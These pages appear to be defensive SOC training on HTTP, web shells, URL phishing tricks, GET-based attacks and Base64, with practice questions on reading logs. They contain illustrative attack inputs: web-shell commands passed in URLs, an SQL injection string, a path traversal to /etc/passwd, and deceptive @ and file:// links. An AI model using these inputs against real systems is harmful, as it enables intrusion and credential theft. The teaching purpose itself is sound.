  • Security response headers are now standard. X-Content-Type-Options: nosniff, Strict-Transport-Security and Content-Security-Policy are on most legitimate services, so a page imitating a big brand with none of them is a weak hint of a hastily built phishing page.
  • Authenticated proxies are less common. With cloud secure web gateways (SWG) or endpoint agents, the 407 trick doesn't apply; look instead for connections that bypass the agent and go out directly.

[Caution] Wrong or risky if done the old way

  • Content-Type is only a claim. Extensions and Content-Type can both lie; judge by magic bytes, resp_mime_types and file hashes.
  • "It's a 404, so nothing happened" is dangerous. Some C2 frameworks return fake 404s so the server looks dead to scanners and researchers, delivering real commands inside the 404 body or only under certain conditions. A 404 that is large, varies in size or repeats on a schedule is suspicious.
  • Date, Last-Modified and Server are server-written too. Times and sizes recorded by your own devices are the primary evidence.

docs.title: Practice questions
docs.text: Answer first, then expand the explanation.

docs.title: Question 1
docs.text:
The company proxy authenticates automatically with Windows credentials. Most PCs show "407 → a 200 with a username within 0.1 s", but one PC logs this all night:

01:00:03  10.1.5.77  -  CONNECT cdn-sync-api.example:443  407
01:05:03  10.1.5.77  -  CONNECT cdn-sync-api.example:443  407
01:10:03  10.1.5.77  -  CONNECT cdn-sync-api.example:443  407
01:15:03  10.1.5.77  -  CONNECT cdn-sync-api.example:443  407

(a) What does the pattern tell you? (b) Why shouldn't you call it malware straight away, and what would you check to decide? (c) Why is it a danger sign even though the C2 connection failed?

Answer and explanation

(a) Some program on this PC tries to reach cdn-sync-api.example exactly every five minutes, all night with nobody there, gets a 407 and never attempts to authenticate. It doesn't know the company proxy — it isn't using Windows' networking stack but its own HTTP code. With the mechanical interval, it's beacon-shaped.

(b) Legitimate software that isn't proxy-aware (sync tools, updaters, developer tools, old programs) makes the same pattern, and cdn-sync-api could pass for a real sync service. To decide:

  1. Which program — EDR or Sysmon Event ID 3 (network connection: which executable connected to which IP and port) for the process connecting to the proxy, and its executable path
  2. Where the file lives (odd places like AppData, Temp?), its digital signature and hash reputation
  3. How it starts automatically (scheduled task, service, Run key or other persistence)
  4. The domain's first-seen date, registration date and reputation
  5. Whether the same PC has connections that bypassed the proxy and went straight out through the firewall

(c) Why it's dangerous despite failing:

  • It proves an unknown program is persistently running on the PC — infection and persistence already succeeded.
  • Once the attacker notices, they may push a proxy-aware version or try another channel (DNS tunnelling, direct connections).
  • Other variants may be succeeding on other PCs; hunt for the same domain and pattern across the organisation.
  • The failure buys you time to find and remove it before it succeeds.

docs.title: Question 2
docs.text:
Zeek http.log and the response header for the same request:

http.log:  method=GET  host=static-img-cdn.example  uri=/img/banner.png
           status_code=200  resp_mime_types=["application/x-dosexec"]
           response_body_len=1245184

Response header:  Content-Type: image/png

(a) What did the server say was inside, and what did Zeek see? Which do you trust, and why? (b) What are the first two bytes of the content most likely to be, in hex? (c) What next?

Answer and explanation

(a) The server claims image/png; Zeek inspected the content and saw application/x-dosexec (a Windows executable). Trust Zeek: Content-Type is a label the server writes freely, while resp_mime_types is based on the content's magic bytes. At about 1.2 MB the size is large for a banner and natural for an executable. Extension (.png), path (/img/) and Content-Type all disguise an executable as an image.

(b) 4D 5A ("MZ") — the Windows executable signature.

(c)

  1. Get the file — the matching Zeek files.log record (the extracted copy, if file extraction is on) or an export from packet capture
  2. Hash it (SHA-256) and check reputation; analyse in an isolated sandbox if needed
  3. Who fetched it — the PC and User-Agent. A normal browser won't execute an executable fetched as an image, so a downloader program that deliberately fetches disguised payloads is probably already on the PC → Sysmon Event ID 3 for the process
  4. Did it run — Sysmon Event ID 11 (file create) to see if it hit disk, Sysmon 1 / 4688 (process create) for that hash executing
  5. Block the domain, find other PCs that fetched the same URL or hash, isolate the PC if needed

docs.title: Question 3
docs.text:
One PC requests the same external address exactly every five minutes:

02:00  GET /status  →  404 Not Found   Content-Length: 0
02:05  GET /status  →  404 Not Found   Content-Length: 0
02:10  GET /status  →  404 Not Found   Content-Length: 0
02:15  GET /status  →  404 Not Found   Content-Length: 18736
02:20  GET /status  →  404 Not Found   Content-Length: 0

A colleague says: "It's all 404s, so there's nothing there. Ignore it." What's wrong with that reasoning, and what might the 02:15 response mean?

Answer and explanation

What's wrong:

  1. Status codes are chosen by the server. A C2 server can return 404 on purpose to look dead to scanners and researchers.
  2. A PC has no reason to hit "an address with nothing there" exactly every five minutes at 2 a.m. The interval itself is a beacon signal.
  3. A normal web server's 404 usually carries an HTML error page of consistent size. A 404 with a 0-byte body every time is unusual in itself.

What 02:15 may mean: normally 0 bytes ("no tasks"), then a single 18,736-byte response. Most likely real commands or extra malware delivered while disguised as a 404. The return to 0 bytes afterwards is the classic "deliver task → back to idle".

Next:

  1. Get the actual content of the 02:15 response (proxy cache, packet capture)
  2. Check host activity right after 02:15 — new processes (Sysmon 1 / 4688), new files (Sysmon 11), new connections (Sysmon 3)
  3. Look for other PCs contacting the same address; consider isolating the PC
  4. Lesson: watch interval and size patterns over status codes

docs.title: Web Servers, URLs and GET
docs.text:
What this page covers

What HTTP is (ordering and delivery), what a web server actually does (hand out files) and why that design leads to web shells, how to catch web shells in Windows logs (4688, Sysmon 1), how to read a URL piece by piece and the phishing tricks hidden in URLs (@, #, %, file://), reading Zeek http.log, and what GET requests look like, how they are logged and how attackers abuse them (SQL injection, path traversal, C2 beacons). Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Correction] = fixes a commonly stated mistake, [Changed]/[Caution] = what changed recently and what is risky if done the old way. The overall flow is on the HTTP overview.

docs.title: Ten key points
docs.text:
1. HTTP is a text order form exchanged between a browser (customer) and a web server (kitchen), which is why logs alone can tell you what happened.
  2. A web server is file sharing: the URL path is appended to a disk path (the document root).
  3. .php, .aspx and .jsp files are executed by the server. Drop one malicious file there and you have a web shell.
  4. Classic web-shell signal: a web server process (w3wp.exe, java.exe, …) spawns cmd.exe / powershell.exe → Event 4688 / Sysmon 1.
  5. Split a URL into protocol → host → port → folder → file → parameters. Read the domain right to left to find the real owner.
  6. If a URL contains @, the part after @ is the real destination. Anything after # is never sent to the server and never logged.
  7. Decode URL encoding such as %27 and %2F; attackers use it to hide dangerous characters.
  8. GET puts everything in the address (URL), so it lands verbatim in web server, proxy and SIEM logs and in browser history. Never send passwords with GET.
  9. Attacks show up in GET parameters: quotes and OR (SQL injection), ../ (path traversal), Base64 blobs on a fixed interval (C2 beacon).
  10. Thousands of sites can sit behind one IP (CDN). Judge and block by domain and URL, not IP.

docs.title: Warm-up: HTTP is "ordering and delivery"
docs.text:
Think of a restaurant. A customer says "one kimchi stew, please" and the kitchen serves it. The web works the same way.

Restaurant Web Proper term Customer Browser (Chrome, Edge, …) Client Kitchen Web server Server Order "Please give me this file" Request Meal File, web page Response Ordering rules The agreed format HTTP (HyperText Transfer Protocol)

A real request really is just a short piece of text:

GET /menu.html HTTP/1.1
Host: www.restaurant.com

Line 1 means "please give me /menu.html (GET), I'm speaking HTTP 1.1". Line 2 means "the shop I'm ordering from is www.restaurant.com".

The server answers like this:

HTTP/1.1 200 OK
Content-Type: text/html

<html> ... menu page ... </html>

200 OK means "order received, here you go", and Content-Type: text/html says "what I'm sending is a web page". Everything below the blank line is the actual content.

Why a SOC cares. HTTP is a human-readable conversation, so incidents can be reconstructed from logs alone. Most of what a company PC does on the internet is this ordering and delivery — and malware downloads and C2 traffic use exactly the same order form. You need to know what a normal order form looks like before an odd one stands out.

docs.title: A web server is a program that hands out files
docs.text: In one sentence, a web server is "fancy file sharing over HTTP". The best-known web server programs are Apache, NGINX and Microsoft IIS.

docs.title: Document root: the URL path is a disk path
docs.text:
A web server has one folder that it is allowed to show to the internet. This is the document root — think of it as the shop's display shelf.

Browser asks for:   /main/index.htm
Linux server:       /var/www/html/main/index.htm
Windows IIS:        C:\inetpub\wwwroot\main\index.htm
  • Line 1: the path the browser asked for
  • Line 2: on a Linux web server (Apache, NGINX) the path is appended to the default document root /var/www/html
  • Line 3: on Windows IIS it is appended to C:\inetpub\wwwroot

The URL path continues straight into the server's disk path. This idea comes back in path traversal.

docs.title: Files served as-is vs files executed first
docs.text:
Type Examples What the server does Analogy Static .html, .jpg, .css Sends it as-is Pre-made side dish Dynamic .php, .aspx, .jsp Runs it first, sends only the output A recipe cooked to order

Pages that can't be prepared in advance, such as search results, are built on the fly by a script using the user's input.

docs.title: Web shell: a recipe slipped in by an attacker
docs.text:
The server follows one rule: "anything in the recipe folder gets executed". If an attacker abuses, say, a flawed upload feature to drop their own recipe into that folder, the server runs the attacker's instructions every time the file is requested. That malicious file is a web shell.

GET /uploads/img.aspx?c=whoami HTTP/1.1
Host: intranet.corp.local
  • "Run /uploads/img.aspx and pass it a value c = whoami"
  • The server runs img.aspx → the malicious code runs whoami (the Windows command that asks "which account am I?") → the output comes back to the attacker as a web page
  • The attacker is remote-controlling the server with nothing but a browser

docs.title: Catching web shells in Windows logs: parent and child processes
docs.text:
Each running program is a process. When one program launches another, the launcher is the parent and the launched program is the child. Open Notepad from the desktop and the parent is explorer.exe, the child notepad.exe.

In IIS the process that handles web requests is w3wp.exe — think of it as the head chef. A normal chef cooks; they almost never open the safe (cmd.exe, powershell.exe). When a web shell runs a command, w3wp.exe spawns cmd.exe as a child. "The chef opened the safe" is the most classic web-shell signal.

Event 4688 — "A new process has been created". Logged to the Security log every time any program starts, with the account, the new process and the parent process.

  • It is off by default. Enable the "Audit Process Creation" audit policy, and to capture the command itself also enable the Group Policy setting "Include command line in process creation events".
  • Why attackers dread it: whatever they do on a server ends up launching programs, and every launch leaves this record.
EventCode=4688
Account Name:          DefaultAppPool
New Process Name:      C:\Windows\System32\cmd.exe
Process Command Line:  cmd.exe /c whoami
Creator Process Name:  C:\Windows\System32\inetsrv\w3wp.exe
Field Meaning EventCode=4688 A new process was created Account Name: DefaultAppPool The IIS site's own service account (not a person) New Process Name The program that started — a command prompt Process Command Line The actual command whoami — same as c=whoami in the URL Creator Process Name The parent — IIS worker w3wp.exe

A GET line in the web server log paired with a 4688 at the same moment is close to certain proof of a web shell.

[Added] Sysmon Event ID 1 (Process Create). Microsoft's free Sysmon tool records the same thing in more detail (file hashes, the parent's command line). Many SOCs use 4688 and Sysmon 1 together.

docs.title: Module (plugin) backdoors: a spy hired as staff
docs.text:
Web servers accept add-on components (Apache mod_* modules, IIS modules) — like hiring new kitchen staff.

[Added] Attackers sometimes register a malicious module as part of the server. Instead of slipping a recipe in as a customer, they get hired as staff. IIS module backdoors have been reported in real incidents. In this case there is no suspicious .aspx file in the web folder, so "look for odd files in the web root" misses it. IIS keeps its registered modules in applicationHost.config; compare it with a known-good baseline to spot "staff you've never seen".

docs.title: Reading a URL piece by piece
docs.text:
Analysts see hundreds of URLs a day. Read them in a fixed order, the way you read a postal address from country to flat number.

http://this.is.a.site.com:8000/mysite/index.html?key1=val&key2=val

http://              ← 1. Protocol (how to talk)
this.is.a.site.com   ← 2. Hostname (which computer)
:8000                ← 3. Port (which door)
/mysite/             ← 4. Folder
index.html           ← 5. File
?key1=val&key2=val   ← 6. Parameters (extra info)

docs.title: 1. Protocol
docs.text:
"Which rules to talk by". http is a postcard (anyone can read it); https is a sealed letter (encrypted). Other protocols include ftp, ssh and file.

[Added] The danger of file://. If a phishing document contains a link like file://203.0.113.5/share/doc.docx, Windows tries to open a file share (SMB) on that machine — and to prove it is allowed in, it may automatically send the user's login credentials (NTLM authentication data). It's like flashing your staff ID to a guard who never asked — at a building the attacker owns. The attacker can try to crack the password from it or relay it to another server to impersonate the user (depending on environment and hardening this may be blocked). Treat file:// or \\IP\ links pointing to external IPs as suspicious.

docs.title: 2. Hostname — read right to left
docs.text:
"Which computer to go to"; DNS turns it into an IP.

  • site.com = parent (registered) domain — the real owner who paid to register it
  • this.is.a = subdomain — whatever the owner chooses to put in front
microsoft.com.login-check.site.com

It starts with microsoft.com, but the real owner at the right-hand end is site.com. Everything before it is just a label site.com's owner added. This trick is everywhere in phishing.

[Correction] Subdomains are not "one per IP address". One apartment block (one IP) can house hundreds of households (sites). The server tells customers apart by the request's Host: line (virtual hosting — see request headers). Conversely, one domain can have several IPs.

docs.title: 3. Port
docs.text: "Which door on that computer". If omitted, http uses 80 and https 443. Ports like 8000, 8080 and 800 are used by legitimate sites too, so a port alone proves nothing; it matters when it overlaps with other signals, such as "a port we never see + a domain we've never seen".

docs.title: 4–5. Folder and file
docs.text: /mysite/index.html is a location inside the document root — a folder and file on the server's disk.

docs.title: 6. Parameters (query string)
docs.text:
Extra information sent to the server. It starts at ?, is written as name=value, and multiple pairs are joined with &.

https://www.google.com/search?q=weather+sydney&hl=en
  • q=weather+sydney → search term "weather sydney" (+ is a space)
  • hl=en → interface language English

Parameters often tell you what the user was doing.

docs.title: Two hidden parts of a URL: @ and #
docs.text:
[Added] The full URL shape (RFC 3986) is:

scheme://userinfo@host:port/path?query#fragment

userinfo@ — a phishing trick.

http://login.microsoftonline.com@198.51.100.7/common/login

By the rules, everything before @ is a "username" and the real destination is 198.51.100.7 after the @. It's an envelope addressed "To Microsoft" in big letters with the attacker's home address as the actual delivery address. Some browsers warn about it, but it still appears in email and document links. Whenever you see @ in a URL, look after it.

#fragment — never sent to the server. The part after # is used only inside the browser, like a note to yourself about which page to bookmark that you don't send to the bookshop. If a user opens https://site.com/page#token=abc, proxy and web server logs only show /page. Not in the log ≠ not in the request.

docs.title: Characters in disguise: URL encoding
docs.text:
Characters that can't appear in a URL are written as % + two hex digits (URL encoding, percent-encoding).

%20  →  (space)
%21  →  !
%27  →  '
%2F  →  /
%3D  →  =

Attackers use it as disguise — writing %27 and %2F to slip past naive checks for ' or /. When a URL is full of %, decode it before judging it.

docs.title: Real log: Zeek http.log
docs.text:
Zeek writes one line per HTTP request to http.log (JSON, key fields only):

{
  "ts": "2026-10-24T07:15:02.113Z",
  "uid": "CHhAvVGS1DHFjwGM9",
  "id.orig_h": "10.1.5.23",
  "id.resp_h": "203.0.113.80",
  "id.resp_p": 8000,
  "method": "GET",
  "host": "this.is.a.site.com:8000",
  "uri": "/mysite/index.html?key1=val&key2=val",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  "status_code": 200,
  "resp_mime_types": ["text/html"]
}
Field Meaning ts Request time. Trailing Z = UTC (Sydney daylight time is +11 h) uid The connection's case number; the same uid ties it to conn.log, files.log id.orig_h Originator — our PC id.resp_h / id.resp_p Responder's IP / port (the door) method Request method (GET) host Host header value; non-default port, so :8000 is included uri Folder, file and parameters user_agent The client's self-introduction status_code Response code (200 = success) resp_mime_types File type Zeek determined by inspecting the response itself

Zeek stores the URL split into host and uri; rebuild the full address as http:// + host + uri. All fields are explained on Zeek http.log.

docs.title: GET = "please give me this"
docs.text: If HTTP methods were a band, GET would be the lead singer. Opening one page fetches HTML, images, CSS and JavaScript as separate GETs, so dozens or hundreds of GETs per site are normal.

docs.title: What it looks like
docs.text:
GET /search?q=weather+sydney&hl=en HTTP/1.1
Host: www.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
  1. GET /search?q=weather+sydney&hl=en HTTP/1.1 — the request line: method (GET) / target (search page + parameters) / version (HTTP/1.1)
  2. Host — which site (which household in the block)
  3. User-Agent — "I'm Chrome on Windows 10"
  4. Accept — "web page format, please"
  5. Accept-Encoding — "you may compress with gzip, deflate or br"
  6. Connection: keep-alive — "keep this connection open for the next file"
  7. Blank line — "end of order"

Lines 2–6 (name: value) are headers (detailed in request headers). The key point: GET puts all its data in the address on the first line; the body is normally empty.

HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
Content-Length: 18342

<!DOCTYPE html><html> ... (search results page) ...

200 OK = success, Server: nginx = the server software introducing itself, Content-Type = what's in the box, Content-Length: 18342 = size in bytes. Response codes are listed on HTTP status codes.

docs.title: Why passwords must never go in a GET
docs.text:
Whatever is in the address is written to the logs verbatim — web servers and proxies normally record the full URL. If a company app wrongly implemented login as GET, the Apache access log (Combined format) would contain:

10.1.5.23 - - [24/Oct/2026:18:15:02 +1100] "GET /login.php?user=jsmith&pass=Winter2026! HTTP/1.1" 302 215 "https://app.corp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
# Value Meaning 1 10.1.5.23 Client IP 2 - ident (legacy, always empty today) 3 - HTTP-auth username (none) 4 [24/Oct/2026:18:15:02 +1100] Time (+1100 = Sydney daylight time) 5 "GET /login.php?user=jsmith&pass=Winter2026! HTTP/1.1" Full request line — password in clear text 6 302 Status ("go to another page") 7 215 Response size (bytes) 8 "https://app.corp.local/" Referer (previous page) 9 "Mozilla/5.0 ..." User-Agent

That one line is copied to the web server, the proxy and the SIEM.

[Added] Two more leak paths.

  • Browser history — the address is saved as-is
  • Referer — the "I just came from this page" note attached to new requests. If a page with the password in its URL loads an external image or link, that URL can travel to a third party. Modern browsers send only the domain to other sites by default, but site settings can change that

So logins, uploads and large data go in the body with POST.

docs.title: Spotting attacks in GET
docs.text:
Whatever an attacker sends with GET is logged too.

Attack 1: SQL injection. The server slots parameter values into a database question (id=1 → "show product 1"). The attacker puts in characters that rewrite the question itself.

GET /product.php?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1

Decoded: id=1' OR '1'='1 → "show product 1, or anything where 1 equals 1". 1=1 is always true, so every row comes back. Quotes, OR, UNION or -- where a number belongs = suspicious.

Attack 2: Path traversal.

GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

Decoded: ../../../etc/passwd. ../ means "one folder up". Using URL path = disk path in reverse, the attacker climbs three levels out of the shelf to read Linux's account list. On Windows it looks like ..\..\windows\win.ini.

Attack 3: A C2 beacon disguised as GET. C2 (Command and Control) is the attacker's server that remote-controls infected PCs; a beacon is the infected PC's regular "still alive — any orders?" call.

GET /images/logo.gif?id=YWRtaW4tUEMx HTTP/1.1
Host: cdn-static-assets.example.net

It looks like an image request, but id is Base64 — a way of rewriting any data as letters, digits, +, / and =. It is gift wrapping, not encryption. Decoded it reads admin-PC1, the infected PC's name. The decisive clue is the repetition: the same PC hitting the same URL exactly every 60 seconds, day and night, is a program, not a person. See Beaconing & C2 detection.

docs.title: What "GET is for small data" really means
docs.text: Servers cap address length (roughly 8 KB for the request line in default Apache and NGINX configs). That does not mean GET can't exfiltrate much: attackers chop data into thousands of GETs or hide it in cookies — moving a sack of rice one spoonful at a time. Watch how many requests go to the same destination, and how regularly, not the size of one request.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

Web server structure, URL anatomy, the shape of GET, and "whatever goes in the address gets logged" all still hold. In HTTP/2 and HTTP/3, GET and paths mean the same thing; only the wire format became binary. Web shells remain the most common artefact after a web server compromise, and "web server process → shell" parent-child detection is still a basic skill.

[Changed]

  • Almost the whole web is HTTPS. On the wire, paths, parameters and headers are encrypted; you mostly see the SNI (the site name announced at the start of the encrypted conversation — the name on the outside of the envelope). Paths and parameters now come from TLS-inspecting proxies, web server logs, WAFs and EDR. ECH (Encrypted Client Hello) is starting to hide even the SNI.
  • Web server rankings. W3Techs, October 2026: Cloudflare 32.5%, NGINX 30.3%, Apache 21.4%, LiteSpeed 14.0%, IIS 2.9%. Cloudflare is a CDN (a delivery-agent chain), so Server: cloudflare is the agent answering; the real (origin) server is hidden.
  • IIS is still a key target inside companies. Exchange and SharePoint run on IIS. In the July 2025 "ToolShell" attacks (CVE-2025-53770), attackers planted a spinstall0.aspx web shell on on-premises SharePoint and stole the MachineKey — the server's official seal for "data I genuinely produced". With the seal they could forge trusted data and get back in even after patching, so the key had to be rotated as well.
  • Limits of "web server = file sharing". With APIs and SPAs, a path like /api/v2/users/1234/orders is a route defined in code, not a file. Normal paths are long and complex, so eyeballing them without a baseline is harder.
  • "No secrets in GET" is now a standard. OAuth's old Implicit Grant (behind "Sign in with Google" style flows) put the access token after # in the URL. RFC 9700 (OAuth 2.0 Security Best Current Practice, January 2025) says not to use it.

[Caution] Wrong or risky if done the old way

  • "One IP = one site" causes outages. One CDN IP fronts thousands of sites; blocking a "malicious IP" blocks legitimate sites too. Judge and block by domain and URL.
  • Don't assume GET is too small for exfiltration. It gets chunked and repeated. Watch count and interval.
  • Your SIEM can become a password store. If any app sends passwords or tokens via GET, they pile up in the SIEM. Review SIEM access, mask at ingestion and tell the app team.

docs.title: Practice questions
docs.text: Answer first, then expand the explanation.

docs.title: Question 1
docs.text:
This link was found in a phishing email:

http://portal.office.com@198.51.100.7:8080/login?next=%2Fmail%2Finbox#step2

(a) Which computer and port does a click actually connect to? (b) Which part is never sent to the server and so never appears in proxy logs? (c) What does the next value decode to?

Answer and explanation

(a) Port 8080 on 198.51.100.7. portal.office.com before the @ is just text in the "username" slot.

(b) #step2. The fragment after # stays in the browser.

(c) %2F = /, so /mail/inbox.

The link combines three phishing tricks: ① a famous domain placed before @ to fool the eye ② next=/mail/inbox to make it feel like a real "log in and we'll take you to your inbox" flow ③ http, not https — a genuine Microsoft login never uses unencrypted http or an IP with port 8080, and with http the typed password crosses the network like a postcard.

docs.title: Question 2
docs.text:
A company IIS web server log contains this line. What is most likely going on, and in the Windows Security log at the same moment, which event ID and which parent-child relationship should you look for?

2026-10-24 07:42:11 10.20.1.15 GET /uploads/avatar.aspx c=ipconfig+/all 443 - 185.220.101.4 Mozilla/5.0 200 0 0 312

(Hint: IIS field order = date, time, server IP, method, path, query, port, username, client IP, User-Agent, status, two sub-status codes, time taken)

Answer and explanation

Most likely a web shell. Four reasons:

  1. An executable .aspx file in uploads, a folder meant for pictures
  2. The parameter is ipconfig /all (+ = space) — a command that dumps network settings, typical post-intrusion reconnaissance
  3. Status 200 — the server processed it, so the command probably ran
  4. The request came from an external IP — check its reputation

Look for Event 4688 with parent (Creator Process Name) w3wp.exe, child (New Process Name) cmd.exe or ipconfig.exe, and command line ipconfig /all.

Time trap: IIS logs default to UTC, while Event Viewer shows the server's local time. On a Sydney server, IIS 07:42:11 appears around 18:42:11 in Event Viewer. Search for 07:42 and you'll wrongly conclude "no trace".

Next steps: find when avatar.aspx was created → look around that time for the same IP uploading it (usually a POST) → pull every other command from that IP → decide on isolating the server. See the Web shell / server playbook.

docs.title: Question 3
docs.text:
Threat intel says "IP 104.21.48.10 is hosting a phishing site", and a lookup shows it's a Cloudflare IP. Is blocking it at the firewall straight away a good response?

Answer and explanation

No. One Cloudflare IP can front thousands of sites, so it's like locking the whole apartment block. Legitimate business sites may break, and the phisher can easily move to another IP, so the block won't last.

Better:

  1. Get the phishing domain / URL from the intel and block that (proxy URL/domain blocking, DNS blocking / RPZ)
  2. Search proxy and DNS logs for staff who already visited it to scope the impact
  3. Report it to Cloudflare's abuse channel if appropriate

docs.title: HTTP(S) Analysis & Attacks
docs.text:
In one line

HTTP is used in almost every stage of an attack (delivery, exploitation, installation, C2, exfiltration). Building on HTTP fundamentals, this section covers how to judge malicious HTTP(S) traffic quickly and dig deep when needed — from automated methods like reputation checks to header and content analysis, file extraction, anomaly hunting and HTTPS (TLS) analysis.

docs.title: Reading order
docs.text:
# Page Key content 1 Attack Stages over HTTP, Analysis Methods, URL Reputation HTTP traces per kill-chain stage, choosing automated vs manual analysis, URL reputation and its traps, OPSEC and defanging, practice questions 2 Screenshots, Sandboxes, and When to Go Manual Confirming phishing with screenshots and reading results, which tools share, network-centric vs VM sandboxes and choosing one, sandbox evasion, combining weak signals manually, practice questions 3 Finding Malware through User-Agents and Cookies Why malware is caught by its User-Agent, field-by-field breakdown and tools, frequency analysis (requests and PCs), version aging, C2 in cookies, a supply-chain case, cookie-abuse checklist, practice questions 4 Base64 — How It Works, Recognising It, Suspicious Base64 Why it exists, bit-level conversion and padding, guessing file types from prefixes, decoding commands (incl. PowerShell UTF-16LE), legitimate uses (JWT, Basic auth, ViewState) vs suspicious Base64, practice questions 5 Malicious Files on Good Sites, File Extraction, Frequent Requests, Bare-IP Connections Malware via cloud sharing, file extraction with Wireshark/tshark/Zeek and safety rules, spotting frequent regular GETs/POSTs, bare-IP connections and root POSTs, practice questions 6 Spotting Exploit Kits, and Malicious/Suspicious/Benign Practice How exploit kits infect, traffic clues and how to confirm success, three practice judgements (inbound Log4Shell, dynamic-DNS redirect chain, jQuery-disguised C2), practice questions 7 HTTPS — TLS Decryption, Working Without It, Reading Certificates Why encryption blinds the SOC, how TLS inspection works and its limits (pinning, privacy, root CA), what each layer shows without decryption, reading certificate fields (openssl, Zeek ssl/x509), suspicious-certificate signals, practice questions 8 TLS Fingerprints (JA3, JA3S, JARM, JA4), TLS 1.3, and the HTTP(S) Analysis Wrap-up How JA3/JA3S are calculated, why JA3 broke and how JA4 works, JARM and its OPSEC risk, what TLS 1.3 takes away (certificates, passive decryption, downgrades, SNI with ECH), SSLKEYLOGFILE, the module checklist, practice questions

Coming next

This module is complete. Next up is a new section: SMTP and email analysis.

docs.title: Things to remember
docs.text:
1. HTTP is used in almost every attack stage, and each stage looks different in logs.
  2. Quick automated checks first; manual analysis when they don't give an answer.
  3. No reputation result ≠ safe. Good domain ≠ safe URL.
  4. Submitting to public scanners can leak information. Defang URLs in records.

  • Phishing delivery technique

docs.title: Base64 — How It Works, Recognising It, Suspicious Base64
Base64 — How It Works, Recognising It, Suspicious Base64
docs.text:
What this page covers

Why Base64 exists (email couldn't carry arbitrary bytes), how it transforms data bit by bit — calculated by hand — what = padding means, how to recognise it and guess the original file type from the first characters, decoding commands, legitimate uses (JWT, Basic auth, data URIs, ViewState) versus suspicious ones, and how to tell them apart. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. Earlier Base64 cases appear in POST abuse and C2 hidden in cookies.

docs.title: Eight key points
docs.text:
1. Base64 is a wrapping that turns any bytes into printable characters. It is not encryption — anyone can undo it instantly.
  2. Its alphabet: the 64 characters A-Z a-z 0-9 + / plus = padding (the URL-safe variant uses - _ instead of + /).
  3. How: concatenate the bits of 8-bit bytes, re-cut them 6 bits at a time, and map each to the 64-character table. 3 bytes → 4 characters.
  4. One or two trailing = are length padding; seeing them makes Base64 very likely (they can also be absent).
  5. The first characters reveal the original. TVqQ = executable, H4sI = gzip, UEsDB = ZIP/Office document, JVBERi0 = PDF, eyJ = JSON (JWT), SQBFAFgA = PowerShell IEX.
  6. Legitimate web traffic uses Base64 a lot. The question is "why encode it here?"
  7. Don't judge on Base64 alone. Suspect it when Base64 where none is needed + a questionable host + an odd User-Agent stack up.
  8. Decoding to unreadable bytes doesn't mean benign — the data may have been encrypted, then Base64-wrapped.

docs.title: Why it exists
docs.text:
Early email (SMTP) standards could only carry byte values 0–127, but images and programs use every value from 0–255 and would break in transit. Using all of 0–127 wasn't safe either: it includes invisible control characters such as line feeds and the bell, which different equipment along the way could interpret differently.

So 64 characters no equipment would misinterpret were chosen, and all data is rewritten using only them. That's Base64 — like rewriting a letter in 64 symbols every post office understands. The content is unchanged; only the lettering changes. Wrapping, not encryption.

Today it's everywhere: email attachments, web cookies, POSTed values, authentication tokens. Legitimate web apps use it heavily, and so does malware for file transfer and C2. Analysts need to recognise it on sight and question it when it's out of place.

docs.title: How it works: converting bits by hand
docs.text:
Three steps:

  1. Concatenate the original data 8 bits (one byte) at a time
  2. Re-cut that bit string 6 bits at a time (6 bits = 0–63, exactly 64 values)
  3. Map each 6-bit value to a character from the table below, padding with = if short
6-bit value Character 0 – 25 A – Z 26 – 51 a – z 52 – 61 0 – 9 62 + 63 / (padding) =

Example 1: AZ → QVo=

Text:        A          Z
ASCII hex:   0x41       0x5A
8-bit:       01000001   01011010
Joined:      0100000101011010 + 00 (pad bits)
6-bit:       010000  010101  101000
Decimal:     16      21      40
Base64:      Q       V       o       =
  • A is 0x41 = 01000001, Z is 0x5A = 01011010
  • Joined they're 16 bits — not a multiple of 6 — so two 0 bits are added to make 18
  • Cut into 6-bit groups: 16, 21, 40 → Q, V, o from the table
  • A full 3-byte (24-bit) group would give 4 characters; with only 2 bytes one is missing → one = fills it

Example 2: the padding rule

"Man" (3 bytes)  →  TWFu      (no padding)
"Ma"  (2 bytes)  →  TWE=      (one =)
"M"   (1 byte)   →  TQ==      (two =)
  • 3 bytes = 24 bits = exactly four 6-bit groups → no padding
  • One byte short → one =; two bytes short → ==
  • So Base64 length is always a multiple of 4 (with padding), and output is about 1.33× the original (3 bytes → 4 characters)

docs.title: Recognising it
docs.text:
Base64 is likely when these overlap:

  • Every character is in A-Z a-z 0-9 + / (or URL-safe - _)
  • It ends in = or == (often absent — no padding when the original length is a multiple of 3)
  • The length is a multiple of 4
  • No human words, just an even mix of upper case, lower case and digits

[Added] Guessing the original from the first characters. Files start with fixed magic bytes, so their Base64 always starts with the same few characters. Memorise these to identify content before decoding:

Base64 starts with Original starts with It is TVqQ MZ + 90 00 Windows executable (EXE, DLL) H4sI 1F 8B 08 gzip compressed UEsDB PK 03 04 ZIP (.docx, .xlsx, .jar are ZIP inside) JVBERi0 %PDF- PDF iVBORw0KGgo 89 PNG PNG image eyJ {" JSON — often a JWT SQBFAFgA I E X (UTF-16LE) PowerShell IEX (run what was fetched)

So a POST body beginning TVqQAAMAAAAEAAAA//8AAA... means a whole executable is being sent, before you even decode it.

docs.title: Decoding
docs.text:
$ echo 'aG9zdD1XUy0wMjMxO3VzZXI9YS5uZ3V5ZW47YXY9RGVmZW5kZXI=' | base64 -d
host=WS-0231;user=a.nguyen;av=Defender
  • echo '...' — print the Base64 string
  • | base64 -d — pipe (|) it into the base64 command's decode (-d) mode
  • Result: PC name, user and installed antivirus — a classic infected-host check-in

In Windows PowerShell:

PS> [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21kPW9rO3NsZWVwPTYwMA=='))
cmd=ok;sleep=600
  • [Convert]::FromBase64String('...') — decode Base64 to bytes
  • [Text.Encoding]::UTF8.GetString(...) — turn bytes into text
